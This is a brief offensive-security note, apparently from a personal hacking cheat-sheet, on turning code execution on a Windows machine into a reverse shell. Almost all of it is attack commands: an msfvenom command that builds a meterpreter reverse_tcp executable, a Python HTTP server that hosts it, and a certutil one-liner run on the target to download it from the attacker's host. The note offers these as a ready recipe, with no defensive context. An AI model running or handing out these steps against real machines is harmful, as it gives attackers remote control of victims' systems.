[../](../)

# Create reverse shell from code execution on Windows machine

First, you create reverse shell executable with msfvenom.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o rev.exe
```

Then you'll host your executable with some http server (in this example I'll use python's http.server).

```
sudo python3 -m http.server 80
```

Now you can setup your listener (multi/handler or normal netcat listener).

And lastly from target Windows machine you'll execute certutil.

```
cmd.exe /C certutil -urlcache -split -f http://<LHOST>/rev.exe rev.exe
```

For more: https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/